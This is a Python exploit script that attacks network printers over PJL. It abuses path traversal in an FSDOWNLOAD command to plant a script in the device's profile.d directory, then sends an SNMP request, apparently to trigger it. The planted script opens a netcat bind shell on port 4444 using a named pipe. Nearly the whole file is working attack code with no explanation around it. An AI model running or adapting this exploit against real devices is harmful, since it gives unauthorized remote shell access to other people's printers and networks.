import socket
import sys
from pysnmp.entity.rfc3413.oneliner import cmdgen

profile_d_script = ('if [ ! -p /tmp/pwned ]; then\n'
                    '\tmkfifo /tmp/pwned\n'
                    '\tcat /tmp/pwned | /bin/sh 2>&1 | /usr/bin/nc -l 4444 > /tmp/pwned &\n'
                    'fi\n')
     
if len(sys.argv) != 3:
    print '\nUsage:upload.py [ip] [port]\n'
    sys.exit()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(2)
server_address = (sys.argv[1], int(sys.argv[2]))
print 'connecting to %s port %s' % server_address
sock.connect(server_address)

dir_query = '@PJL FSDOWNLOAD FORMAT:BINARY SIZE=' + str(len(profile_d_script)) + ' NAME="0:/../../rw/var/etc/profile.d/lol.sh"\r\n'
dir_query += profile_d_script
dir_query += '\x1b%-12345X'
sock.sendall(dir_query)
sock.close()

sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock1.connect(server_address)
dir_query = '@PJL FSQUERY NAME="0:/../../rw/var/etc/profile.d/lol.sh"\r\n'
sock1.sendall(dir_query)


def snmpget():
    cg = cmdgen.CommandGenerator()
    errorIndication, errorStatus, errorIndex, varBinds = cg.getCmd(

    cmdgen.CommunityData('integer', 'public', 0),  

    cmdgen.UdpTransportTarget((sys.argv[1], 161)),

    '.1.3.6.1.2.1.43.5.1.1.3.1'

    )

def runit(loop=1):

    for i in range(loop):

        snmpget()

        #print i 

if __name__ == "__main__":

    runit(loop=1) 
